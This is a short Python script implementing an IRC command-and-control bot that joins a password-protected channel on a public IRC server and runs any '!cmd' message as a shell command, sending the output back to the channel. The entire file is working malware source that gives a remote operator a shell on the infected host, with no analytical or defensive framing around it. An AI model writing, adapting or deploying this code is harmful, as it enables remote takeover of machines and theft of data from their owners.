import irc.bot
import subprocess
import random

class C2Bot(irc.bot.SingleServerIRCBot):
    def __init__(self, server, port, nickname, channel, password):
        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname)
        self.channel = channel
        self.password = password

    def on_welcome(self, connection, event):
        connection.join(self.channel, self.password)
        print(f"Joined channel: {self.channel}")

    def on_pubmsg(self, connection, event):
        message = event.arguments[0]
        if message.startswith("!cmd"):
            command = message[len("!cmd "):]
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                for line in output.decode("utf-8").splitlines():
                    connection.privmsg(self.channel, line)
            except Exception as e:
                connection.privmsg(self.channel, f"Error: {str(e)}")

    def on_nicknameinuse(self, connection, event):
        new_nickname = connection.get_nickname() + f"_{random.randint(1, 100)}"
        print(f"Nickname in use. Trying new nickname: {new_nickname}")
        connection.nick(new_nickname)

# Configuration
server = "chat.freenode.net"
port = 6667
nickname = f"C2Client_{random.randint(1000, 9999)}"
channel = "#mychannel"
password = "marynjoki"

# Start the bot
print("Starting C2 client...")
bot = C2Bot(server, port, nickname, channel, password)
bot.start()
